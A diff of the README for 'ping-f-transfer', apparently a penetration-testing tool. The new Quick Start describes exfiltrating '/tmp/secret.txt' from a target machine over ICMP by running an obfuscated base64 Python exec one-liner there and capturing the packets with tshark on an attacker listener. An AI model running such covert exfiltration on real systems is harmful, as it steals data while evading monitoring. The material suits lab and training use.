@@ -89,26 +89,41 @@ Replace `ping-f-transfer` with `python3 ping-f-transfer.py` in all examples belo
 
 ## Quick Start
 
-**Sender** (machine that has the file):
+The following workflow shows a practical usage for this tool.
 
+### Step 1: Capture ICMP packets
+In the machine we want to save the file, execute:
 ```bash
-# Direct transfer using ping
-ping-f-transfer transfer -f secret.txt -i 10.10.14.5
-
-# Or generate a oneliner to paste on the sender machine
-ping-f-transfer generate -f secret.txt -i 10.10.14.5 -l python
+# Capture ICMP packets
+sudo tshark -i tun0 -l -Y 'icmp.type==8 && ip.src==10.10.10.50' -T fields -e data.data > capture.hex
 ```
 
-**Receiver** (your machine, must start _before_ the sender):
-
+### Step 2: Transfer file using 'ping' with 'ping-f-transfer'
+In the machine we want to save the file (same as previous step, but another terminal) we use `generate` command (recommended). This generates a oneliner command that can be later executed in the machine we want to transfer
 ```bash
-# 1. Capture ICMP packets
-sudo tshark -i tun0 -l -Y 'icmp.type==8 && ip.src==10.10.10.50' -T fields -e data.data > capture.hex
+# Generate a oneliner to paste on the sender machine
+ping-f-transfer generate -f '/tmp/secret.txt' -i 10.10.14.5 -l python
+```
+Where `10.10.14.5` is the machine we will transfer the file, and `/tmp/secret.txt` is the absolute path for the file we want to transfer in the target machine.
 
-# 2. Decode the captured data
+### Step 3: Execute generated payload in target machine to transfer file
+We can now execute the command generated on `Step 3` in the target machine (the machine that contains the file we want to transfer `/tmp/secret.txt`):
+```bash
+# Executing generated payload by 'ping-f-transfer' in the machine we want to transfer the file (target machine) 
+python3 -c "exec(__import__('base64').b64decode(b'aW1w<SNIP>KQo=').decode())"
+```
+If the command works, we should get a hit on the "listener" with `tshark` started on `Step 1`.
+
+### Step 4: Decode captured data
+Once the transfer is complete we can press `Ctrl+C` to stop `tshark` in the machine we have captured the ICMP packets.
+
+We can then decode captured packets to build the original file and complete the transfer:
+```bash
+# Decode the captured data
 LC_ALL=C sort -u capture.hex | cut -c7- | xxd -r -p > secret.txt
 
-# 3. Verify integrity
+# (Optional, but recommended) Verify integrity
+# Script output shows the original SHA256-hash to compare
 sha256sum secret.txt
 ```
 
